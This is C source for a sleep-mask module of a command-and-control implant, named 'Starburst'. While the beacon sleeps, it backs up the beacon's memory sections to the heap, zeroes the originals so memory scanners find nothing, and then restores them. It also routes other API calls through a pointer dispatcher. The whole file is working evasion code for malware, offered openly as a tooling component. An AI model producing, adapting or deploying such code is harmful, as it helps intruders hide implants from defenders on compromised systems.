#include <sleepmask.h>

/*
 * Starburst Sleepmask-VS: Erase Mask
 *
 * Instead of XOR masking beacon memory during sleep, this mask backs up
 * each region to a heap allocation, zeros the original memory, sleeps,
 * then restores from the backup. During sleep there is no beacon code
 * in the original memory regions, only zeroes.
 */

WINBASEAPI PVOID  WINAPI KERNEL32$VirtualAlloc( PVOID, SIZE_T, DWORD, DWORD );
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualProtect( PVOID, SIZE_T, DWORD, PDWORD );
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualFree( PVOID, SIZE_T, DWORD );

#define VirtualAlloc   KERNEL32$VirtualAlloc
#define VirtualProtect KERNEL32$VirtualProtect
#define VirtualFree    KERNEL32$VirtualFree

/* Execute a FUNCTION_CALL via its typed pointer */
static ULONG_PTR dispatch_call( PFUNCTION_CALL fc ) {
    ULONG_PTR ret = 0;

    switch ( fc->numOfArgs ) {
        case 0:  ret = ((BEACON_GATE_00) fc->functionPtr)(); break;
        case 1:  ret = ((BEACON_GATE_01) fc->functionPtr)( fc->args[0] ); break;
        case 2:  ret = ((BEACON_GATE_02) fc->functionPtr)( fc->args[0], fc->args[1] ); break;
        case 3:  ret = ((BEACON_GATE_03) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2] ); break;
        case 4:  ret = ((BEACON_GATE_04) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3] ); break;
        case 5:  ret = ((BEACON_GATE_05) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4] ); break;
        case 6:  ret = ((BEACON_GATE_06) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5] ); break;
        case 7:  ret = ((BEACON_GATE_07) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6] ); break;
        case 8:  ret = ((BEACON_GATE_08) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7] ); break;
        case 9:  ret = ((BEACON_GATE_09) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8] ); break;
        case 10: ret = ((BEACON_GATE_10) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8], fc->args[9] ); break;
    }

    return ret;
}

/*
 * sleep_mask - Entry point called by the Starburst agent.
 *
 * beaconInfo:    describes the beacon image, heap records, and memory regions
 * functionCall:  the API call to execute (with optional masking)
 */
VOID sleep_mask( PBEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {

    if ( ! functionCall )
        return;

    if ( ! functionCall->bMask ) {
        /* Beacon Gate path: execute the call without masking */
        functionCall->retValue = dispatch_call( functionCall );
        return;
    }

    /*
     * Sleep mask path: back up beacon memory sections, erase originals,
     * sleep, restore.
     */

    PVOID sec_backups[6 * 8] = { 0 };
    DWORD oldProtect = 0;
    int idx = 0;

    /* Back up each maskable section and zero the original memory */
    for ( int r = 0; r < 6; r++ ) {
        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
        if ( ! reg->AllocationBase || reg->RegionSize == 0 ) {
            idx += 8;
            continue;
        }
        for ( int s = 0; s < 8; s++, idx++ ) {
            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
            if ( ! sec->BaseAddress || sec->VirtualSize == 0 || ! sec->MaskSection )
                continue;

            DWORD size = (DWORD) sec->VirtualSize;

            sec_backups[idx] = VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
            if ( ! sec_backups[idx] )
                continue;

            /* Copy section contents to backup */
            for ( DWORD j = 0; j < size; j++ )
                ((PBYTE) sec_backups[idx])[j] = ((PBYTE) sec->BaseAddress)[j];

            /* Make section writable so we can erase it */
            VirtualProtect( sec->BaseAddress, size, PAGE_READWRITE, &oldProtect );

            /* Zero the original memory byte-by-byte */
            for ( DWORD j = 0; j < size; j++ )
                ((PBYTE) sec->BaseAddress)[j] = 0;
        }
    }

    /* Execute the queued API call (e.g. WaitForSingleObject) */
    functionCall->retValue = dispatch_call( functionCall );

    /* Restore each section from its backup */
    idx = 0;
    for ( int r = 0; r < 6; r++ ) {
        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
        if ( ! reg->AllocationBase || reg->RegionSize == 0 ) {
            idx += 8;
            continue;
        }
        for ( int s = 0; s < 8; s++, idx++ ) {
            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
            if ( ! sec->BaseAddress || sec->VirtualSize == 0 || ! sec_backups[idx] )
                continue;

            DWORD size = (DWORD) sec->VirtualSize;

            /* Make section writable for restore */
            VirtualProtect( sec->BaseAddress, size, PAGE_READWRITE, &oldProtect );

            /* Copy backup contents back */
            for ( DWORD j = 0; j < size; j++ )
                ((PBYTE) sec->BaseAddress)[j] = ((PBYTE) sec_backups[idx])[j];

            /* Re-apply original protection */
            VirtualProtect( sec->BaseAddress, size, sec->CurrentProtect, &oldProtect );

            /* Free the backup */
            VirtualFree( sec_backups[idx], 0, MEM_RELEASE );
        }
    }
}
